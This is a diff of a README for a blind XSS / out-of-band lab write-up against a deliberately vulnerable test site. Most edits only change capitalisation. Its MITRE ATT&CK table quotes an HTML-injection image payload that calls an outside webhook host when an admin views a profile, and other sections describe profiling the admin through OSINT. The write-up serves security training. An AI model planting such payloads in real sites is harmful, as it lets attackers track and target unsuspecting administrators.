@@ -1,6 +1,6 @@
 > **English** | [Italiano](README.md)
 
-# Blind XSS / Out-of-Band (OOB) Interaction
+# Blind XSS / Out-of-Band (OOB) interaction
 
 > - **Phase:** Web Attack - Blind XSS / Out-of-Band
 > - **Visibility:** Zero on the attacker side - the payload is injected blindly and only activates when another person (e.g., admin) views the infected data
@@ -21,9 +21,9 @@ The objective is to make the vulnerable application "call" an external server co
 
 ---
 
-## 2 Attack Simulation
+## 2 Attack simulation
 
-#### Payload Construction
+#### Payload construction
 
 Due to input field length restrictions, an HTML Injection payload was used targeting a network request to a listening server (C2).
 
@@ -49,7 +49,7 @@ The Referer field (`http://testphp.vulnweb.com/`) confirms that the attack was s
 
 ---
 
-## 3 Impact Analysis
+## 3 Impact analysis
 
 Although this specific payload does not exfiltrate cookies, it demonstrates the ability to:
 
@@ -58,7 +58,7 @@ Although this specific payload does not exfiltrate cookies, it demonstrates the 
 
 ---
 
-## 4 Post-Exploitation: OSINT Analysis
+## 4 Post-Exploitation: OSINT analysis
 
 Using the exfiltrated data (particularly the victim's IP address), it is possible to conduct an Open Source Intelligence (OSINT) phase to geolocate and identify the target organization.
 
@@ -76,13 +76,13 @@ The attacker can trace:
 
 ---
 
-## MITRE ATT&CK Mapping
+## MITRE ATT&CK mapping
 
-| Tactic | Technique | MITRE ID | Action Description |
+| tactic | technique | mitre id | action description |
 | :--- | :--- | :--- | :--- |
-| Initial Access | Exploit Public-Facing Application | `T1190` | Injection of OOB payload (`<img src="https://webhook.site/...">`) in the user profile "Address" field, activating when the admin views the profile (WEB-007) |
-| Collection | Browser Session Hijacking | `T1185` | The OOB callback received on webhook.site reveals the administrator's browser and IP, opening the path to specific targeting (WEB-007) |
-| Reconnaissance | Gather Victim Identity Information | `T1589` | Analysis of received OOB data (IP, User-Agent, Referer) to identify the admin's ISP, geolocation and browser type (WEB-007) |
+| initial access | exploit public-facing application | `T1190` | injection of oob payload (`<img src="https://webhook.site/...">`) in the user profile "address" field, activating when the admin views the profile (WEB-007) |
+| collection | browser session hijacking | `T1185` | the oob callback received on webhook.site reveals the administrator's browser and ip, opening the path to specific targeting (WEB-007) |
+| reconnaissance | gather victim identity information | `T1589` | analysis of received oob data (ip, user-agent, referer) to identify the admin's isp, geolocation and browser type (WEB-007) |
 
 ---
 
